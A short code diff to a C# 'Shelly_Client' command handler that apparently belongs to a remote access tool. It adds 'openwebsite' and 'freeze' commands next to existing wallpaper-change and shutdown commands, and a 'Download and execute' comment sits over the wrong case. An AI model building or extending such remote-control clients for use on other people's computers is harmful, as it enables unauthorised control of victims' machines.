@@ -52,11 +52,28 @@ namespace Shelly_Client
                     
                     break;
 
+                // Open website
+                case "openwebsite":
+
+                    // Open website
+                    Functions.General.OpenWebsite(Command[1]);
+                    break;
+
                 // Download and execute
                 case "changewallpaper":
 
                     // Change wallpaper
                     Functions.Fun.CWP(Command[1]);
+                    break;
+
+                // Freeze
+                case "freeze":
+
+                    // Disconnect
+                    SocketHandler.Disconnect();
+
+                    // Freeze
+                    Functions.Fun.Freeze();
                     break;
 
                 // Shutdown computer
